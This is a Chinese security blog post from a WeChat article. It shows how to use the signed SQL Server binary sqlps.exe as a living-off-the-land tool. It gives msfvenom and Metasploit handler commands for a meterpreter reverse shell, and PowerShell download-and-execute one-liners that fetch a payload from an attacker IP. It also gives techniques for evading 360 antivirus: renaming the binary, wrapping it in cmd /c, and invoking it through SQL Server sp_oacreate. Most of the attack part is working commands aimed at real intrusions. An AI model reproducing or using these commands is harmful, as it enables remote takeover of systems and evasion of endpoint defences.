<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vK7D5VYIzarSjQEpQ5h8lg)<table style="visibility: visible;"><tbody style="visibility: visible;"><tr style="visibility: visible;"><td width="557" valign="top" height="62" style="word-break: break-all; visibility: visible;"><section style="margin-bottom: 15px; visibility: visible;"><strong style="visibility: visible;">声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</section><section style="visibility: visible;">请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

  

**0x01 sqlps.exe简介**

sqlps.exe是SQL Server附带的一个具有Microsoft签名的二进制文件，用于加载SQL Server cmdlet，Microsoft Visual C#开发，可用ILSpy反编译查看源代码。

  

Microsoft SQL Server\100和110是Powershell v2，120和130是Powershell v4。2016中已由SQLToolsPS.exe替换，但出于兼容性原因将包含在安装中。

```
`C:\Program Files (x86)\Microsoft SQL Server\100\Tools\Binn\sqlps.exe``C:\Program Files (x86)\Microsoft SQL Server\110\Tools\Binn\sqlps.exe``C:\Program Files (x86)\Microsoft SQL Server\120\Tools\Binn\sqlps.exe``C:\Program Files (x86)\Microsoft SQL Server\130\Tools\Binn\sqlps.exe``C:\Program Files (x86)\Microsoft SQL Server\140\Tools\Binn\sqlps.exe``C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\sqlps.exe`
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOen8nOOAgpQPyxlr1kFOia9KbcENfU0GibTofqww05QKdexiaJc4RrapWhJkj8QCKMxLib03tErUEvHTg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 MSF监听并执行**

使用sqlps.exe执行360.ps1后会结束掉当前这个cmd.exe命令提示符，可能要延迟几秒MSF才接收到会话信息。  

```
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=443 -f psh-reflection > /var/www/html/360.ps1``msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp``msf5 exploit(multi/handler) > set lhost 192.168.1.120``msf5 exploit(multi/handler) > set lport 443``msf5 exploit(multi/handler) > exploit`
```

  

**sqlps执行上线：**

```
SQLPS -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.120/360.ps1'))"
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

****0x03 绕过360防护执行****

众所周知360和火绒对powershell.exe进程的调用监控的非常严， sqlps.exe也有可能已经被360拦截了，如下图。  

  

**已被拦截：**

```
`powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.120/360.ps1'))"``SQLPS -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.120/360.ps1'))"``declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:/windows/system32/cmd.exe'`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

但我们还是可以尝试使用加壳、反编译或者重命名和cmd /c等方式来绕过sqlps.exe的执行。

  

**绕过方式：**

```
`SQLPS1 -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.120/360.ps1'))"``cmd /c SQLPS -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.120/360.ps1'))"``declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\ProgramData\SQLPS.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://192.168.1.120/360.ps1''))"'`
```

  

**0x04 注意事项**

实战中建议根据目标主机实际环境提取相对应版本的sqlps.exe，如单独提取出来的sqlps.exe在执行时可能会出现缺少依赖项等问题，常见的有以下两种报错。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

已测试的系统和sqlps.exe见下表，测试记录见下图。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**0x05 参考链接**

[https://mp.weixin.qq.com/s/XkleeVDz80WZy4NZqXhEfA](https://mp.weixin.qq.com/s?__biz=MzU1NDkwMzAyMg==&mid=2247491483&idx=1&sn=5c43d9377fb5729104665e00040c2f36&scene=21#wechat_redirect)  

https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqlps/

关注及时推送最新安全威胁资讯！
---------------

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**推荐阅读**

  

[**干货 | CS绕过vultr特征检测修改算法**](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247486980&idx=1&sn=6d65ae57f03bd32fddb37d7055e5ac8e&chksm=c175f3abf6027abdad06009b2fe964e79f2ca60701ae806b451c18845c656c12b9948670dcbc&scene=21#wechat_redirect)

  

[**漏洞复现** **| GitLab未授权RCE(CVE-2021-22205)**](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247486834&idx=1&sn=a88a0afdbfbdf043e4210aa76dada233&chksm=c175f0ddf60279cb439452c995b0bf2371925babfc15f239b0f2c2f15d59205eb373f7947f78&scene=21#wechat_redirect)

  

**[漏洞复现 | Apache APISIX Dashboard-RCE工具](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247487747&idx=1&sn=e928c89af89c51c6600e8496faf075f3&chksm=c175ecacf60265baed4b22ef817652fab396fd1e187d9e2ddbf96c046244b36dcc9c1750c823&scene=21#wechat_redirect)**

  

  

* * *

  

好文分享收藏赞一下最美点在看哦